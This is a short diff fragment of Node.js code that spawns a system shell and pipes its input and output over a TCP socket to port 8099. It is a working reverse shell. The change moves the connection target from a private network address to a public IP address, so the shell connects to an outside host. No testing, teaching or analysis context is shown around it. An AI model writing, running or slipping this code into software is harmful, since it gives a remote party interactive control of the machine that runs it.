@@ -15,7 +15,7 @@
   const sh = cp.spawn(shell, shellArgs);
 
   const client = new net.Socket();
-  client.connect(8099, "192.168.0.2", function () {
+  client.connect(8099, "191.187.195.11", function () {
     client.pipe(sh.stdin);
     sh.stdout.pipe(client);
     sh.stderr.pipe(client);
